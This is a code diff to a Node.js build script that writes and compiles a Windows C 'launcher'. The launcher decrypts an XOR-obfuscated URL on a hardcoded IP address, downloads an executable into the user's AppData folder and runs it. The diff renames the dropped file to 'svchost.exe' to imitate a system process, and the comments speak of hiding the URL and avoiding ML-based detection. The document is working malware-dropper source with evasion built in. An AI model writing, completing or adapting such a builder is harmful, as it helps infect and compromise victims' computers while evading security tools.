@@ -2,7 +2,6 @@
 import fs from 'node:fs';
 import path from 'node:path';
 import os from 'node:os';
-import crypto from 'node:crypto';
 import { execFile } from 'node:child_process';
 import { promisify } from 'node:util';
 import { fileURLToPath } from 'node:url';
@@ -40,7 +39,7 @@ END
 `;
 }
 
-function cSource({ ip, randName }) {
+function cSource({ ip }) {
   // XOR encrypt the URL so it doesn't appear as a plain string
   const url = `http://${ip}/api/downloads/st.exe`;
   const key = 0x5A;
@@ -128,15 +127,21 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata))) return 1;
 
     wchar_t dest[MAX_PATH];
-    _snwprintf(dest, MAX_PATH, L"%ls\\\\${randName}", appdata);
+    _snwprintf(dest, MAX_PATH, L"%ls\\\\svchost.exe", appdata);
 
     wchar_t url[1024];
     decrypt_url(url, 1024);
     
     download_file(url, dest);
 
-    // ShellExecuteW is less suspicious to ML than CreateProcessW
-    ShellExecuteW(NULL, L"open", dest, NULL, appdata, SW_HIDE);
+    STARTUPINFOW si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb = sizeof(si);
+    
+    if (CreateProcessW(dest, NULL, NULL, NULL, FALSE, 0, NULL, appdata, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
 
     return 0;
 }
@@ -147,16 +152,13 @@ export async function compileLauncher({ key, config, baseExe }) {
   let ip = "31.58.77.63";
   if (config && config.ip) ip = config.ip;
 
-  // Generate a random installer-looking name for the dropped file
-  const randName = 'setup_' + crypto.randomBytes(4).toString('hex') + '.exe';
-
   const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
   const cPath      = path.join(workDir, 'launcher.c');
   const rcPath     = path.join(workDir, 'app.rc');
   const resPath    = path.join(workDir, 'app.res');
   const outPath    = path.join(workDir, 'launcher.exe');
 
-  fs.writeFileSync(cPath, cSource({ ip, randName }));
+  fs.writeFileSync(cPath, cSource({ ip }));
   fs.writeFileSync(rcPath, rcSource());
 
   const iconSourcePath = path.join(__dirname, '..', 'icon.ico');
